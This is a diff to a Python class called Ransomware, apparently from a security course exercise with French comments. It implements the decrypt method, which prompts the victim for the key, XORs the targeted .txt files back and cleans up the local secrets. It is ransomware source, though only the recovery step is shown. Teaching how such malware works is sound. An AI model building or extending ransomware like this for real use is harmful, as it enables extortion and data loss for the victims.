@@ -49,7 +49,22 @@ class Ransomware:
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        secret_manager = SecretManager()
+        secret_manager.load()  # Charge les éléments cryptographiques locaux
+        files = self.get_files(".txt")
+        while True:
+            try:
+                key = input("La cle s'il te plait : ")  
+                secret_manager.set_key(key) #si faux ici alors exception
+                secret_manager.xorfiles(files)  #on restaure 
+                secret_manager.clean() #on netoie
+                print(" C'est ça bien joué tu es libéré") 
+                break  
+
+            except Exception as e:
+                print(f"Error: {e}")  
+                print("Faux ! recomence") 
+                continue 
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
